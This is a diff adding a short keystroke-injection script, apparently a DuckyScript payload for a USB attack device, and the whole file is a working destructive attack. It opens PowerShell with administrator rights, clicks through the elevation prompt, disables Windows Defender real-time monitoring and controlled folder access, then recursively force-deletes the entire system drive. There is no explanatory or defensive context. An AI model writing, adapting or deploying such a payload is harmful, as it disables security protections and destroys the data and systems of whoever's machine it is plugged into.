@@ -1,0 +1,21 @@
+DELAY 800
+GUI x
+STRING powershell
+DELAY 750
+CTRL SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+DELAY 750
+STRING Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -EnableControlledFolderAccess Disabled
+DELAY 500
+ENTER
+DELAY 750
+STRING Remove-Item -Path $Env:SYSTEMDRIVE -Force -Recurse
+DELAY 500
+ENTER
+DELAY 750
+STRING exit
+DELAY 500
+ENTER
